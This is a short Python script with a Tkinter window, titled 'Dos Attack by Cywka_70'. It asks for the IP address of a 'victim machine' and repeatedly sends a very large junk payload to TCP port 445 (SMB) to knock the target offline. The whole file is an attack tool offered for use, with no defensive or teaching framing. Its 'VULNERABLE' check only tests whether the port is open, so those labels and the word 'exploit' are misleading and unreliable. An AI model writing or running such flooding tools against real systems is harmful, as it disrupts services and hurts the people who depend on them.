import socket
from tkinter import *
from tkinter import messagebox
def exploit(host, port) :
	while True:
		tcp_connect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		if tcp_connect.connect_ex((host, port)):
			print('[-] Target is NOT VULNERABLE')
			messagebox.showerror("Error", 'Target is NOT VULNERABLE!')
			ip.set("")
			break
		else:
			messagebox.showinfo("Info", 'Target is VULNERABLE!')
			print('[+] Trying to exploitation target!')
			while True:
				try:
					print('[+] Sending exploit packet')
					tcp_connect.send(pkt)
					print('[+] Complete!')
				except:
					print('[-] Sending failed! Connection reset!')
					messagebox.showerror("Error", 'Connection reset!')
					ip.set("")
					break
def attack(mode) :
	if mode == 1:
		exploit(ip.get(), port)
A = "mbcfhmcfhbvfomscxmcetcmtbi,ecj5ev,vc3v 8e i.4bmc ,utcerccjcyccusxdsxxzxdfgh" * 2000000
B = str(A)
pkt = bytearray(B, "UTF-8")
port = 445
win = Tk()
win.title('Dos Attack by Cywka_70')
ip = StringVar()
win.geometry(f"250x270+100+200")
text = Label(win, text='Enter IP address of victim machine', font=('Arial', 10)).place(relx=.5, rely=.3, anchor="center")
entry = Entry(win, textvariable=ip, font=('Arial', 15)).place(relx=.5, rely=.5, anchor="center")
bnt = Button(win, text='Attack!', font=('Arial', 15), command=lambda : attack(1)).place(relx=.5, rely=.7, anchor="center")
win.mainloop()
